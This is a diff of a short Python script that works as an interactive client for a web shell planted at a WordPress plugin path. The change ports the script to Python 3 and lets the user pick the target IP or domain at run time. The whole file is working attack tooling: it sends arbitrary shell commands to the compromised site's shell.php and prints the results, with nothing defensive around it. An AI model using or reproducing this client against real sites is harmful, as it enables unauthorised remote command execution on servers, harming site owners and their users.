@@ -1,12 +1,24 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 # GNU GPLv2 License.
-# Modify the address and then you can run commands like if you are in a shell. That's just more convinient when you can't get another shell yet.
+# Convinient. Use "rip" command to replace target.
 
 import requests
 
-while 1==1:
-    command = raw_input('dolan@pls: ')
-    shellget = "http://10.1.1.1/wp-content/plugins/shell/shell.php?cmd="
+targetid = input("Target ip/domain: ")
+
+while True:
+    command = input('dolan@pls: ')
+    if command == "rip":
+        targetid = input("Target ip/domain: ")
+        command = input('dolan@pls: ')
+
+    shellget = "http://" + targetid + "/wp-content/plugins/shell/shell.php?cmd="
     req_shellget=str(shellget+command)
-    rv = requests.get(req_shellget)
-    print rv.content
+
+    try:
+        rv = requests.get(req_shellget)
+        print(rv.content)
+    except requests.exceptions.Timeout:
+        print("Timeout error")
+    except:
+        print("Connection error")
